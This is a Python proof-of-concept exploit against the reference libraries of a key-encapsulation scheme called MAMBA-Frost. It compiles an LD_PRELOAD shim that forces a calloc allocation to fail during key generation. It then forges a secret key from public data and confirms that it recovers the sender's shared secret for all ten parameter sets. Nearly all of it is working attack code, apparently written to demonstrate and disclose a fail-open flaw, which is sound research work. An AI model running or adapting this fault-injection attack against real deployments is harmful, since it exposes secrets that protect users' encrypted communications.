#!/usr/bin/env python3
"""Force MAMBA-Frost's matrix allocation failure and recover KEM secrets."""

from __future__ import annotations

import ctypes
import os
from pathlib import Path
import subprocess
import sys
import tempfile


ROOT = Path(__file__).resolve().parent
SETS = {
    "MAMBA-Frost-128": 512,
    "MAMBA-Frost-192": 880,
    "MAMBA-Frost-256": 1288,
    "MAMBA-Frost-384": 1928,
    "MAMBA-Frost-512": 2600,
    "MAMBA-Frost-CC-128": 512,
    "MAMBA-Frost-CC-192": 880,
    "MAMBA-Frost-CC-256": 1288,
    "MAMBA-Frost-CC-384": 1928,
    "MAMBA-Frost-CC-512": 2600,
}


def worker(name: str) -> None:
    lib = ctypes.CDLL(str(ROOT / "lib" / f"lib{name}.so"))
    for getter in ("kem_get_pk_len_bytes", "kem_get_sk_len_bytes", "kem_get_ss_len_bytes", "kem_get_ct_len_bytes"):
        getattr(lib, getter).restype = ctypes.c_ulonglong
    pk_len = lib.kem_get_pk_len_bytes()
    sk_len = lib.kem_get_sk_len_bytes()
    ss_len = lib.kem_get_ss_len_bytes()
    ct_len = lib.kem_get_ct_len_bytes()
    # kem.c fixes BYTES_PKHASH at 32, while CRYPTO_BYTES equals ss_len.
    secret_bytes = sk_len - pk_len - 32 - ss_len
    assert secret_bytes > 0

    U8 = ctypes.c_ubyte
    pk, sk = (U8 * pk_len)(), (U8 * sk_len)()
    pk_out, sk_out = ctypes.c_ulonglong(), ctypes.c_ulonglong()
    assert lib.kem_keygen(pk, ctypes.byref(pk_out), sk, ctypes.byref(sk_out)) == 0

    ct, sender = (U8 * ct_len)(), (U8 * ss_len)()
    ct_out, ss_out = ctypes.c_ulonglong(), ctypes.c_ulonglong()
    assert lib.kem_enc(pk, pk_len, sender, ctypes.byref(ss_out), ct, ctypes.byref(ct_out)) == 0

    forged_sk = (U8 * sk_len).from_buffer_copy(bytes(sk))
    ctypes.memset(forged_sk, 0, secret_bytes)
    ctypes.memset(ctypes.byref(forged_sk, sk_len - ss_len), 0, ss_len)
    recovered, holder = (U8 * ss_len)(), (U8 * ss_len)()
    recovered_out, holder_out = ctypes.c_ulonglong(), ctypes.c_ulonglong()
    assert lib.kem_dec(forged_sk, sk_len, ct, ct_len, recovered, ctypes.byref(recovered_out)) == 0
    assert lib.kem_dec(sk, sk_len, ct, ct_len, holder, ctypes.byref(holder_out)) == 0
    assert bytes(recovered) == bytes(sender)
    assert bytes(holder) != bytes(sender)
    print(f"{name}: public-key-constructible zero secret RECOVERED; faulty holder rejected")


def main() -> None:
    if len(sys.argv) == 3 and sys.argv[1] == "--worker":
        worker(sys.argv[2])
        return

    missing = [name for name in SETS if not (ROOT / "lib" / f"lib{name}.so").exists()]
    if missing:
        raise SystemExit("missing libraries; run: make -C kem-20")

    with tempfile.TemporaryDirectory(prefix="ngcc-mamba-calloc-") as tmp:
        preload = Path(tmp) / "fail_target_calloc.so"
        subprocess.run(
            [os.environ.get("CC", "cc"), "-shared", "-fPIC", "-O2", str(ROOT / "fail_target_calloc.c"), "-ldl", "-o", str(preload)],
            check=True,
        )
        for name, n in SETS.items():
            env = os.environ.copy()
            env["LD_PRELOAD"] = str(preload)
            env["NGCC_FAIL_CALLOC_NMEMB"] = str(n * n)
            subprocess.run([sys.executable, str(Path(__file__).resolve()), "--worker", name], env=env, check=True)

    print("ATTACK kem-20-1 CONFIRMED: fail-open key generation exposes shared secrets in all ten reference instances")


if __name__ == "__main__":
    main()
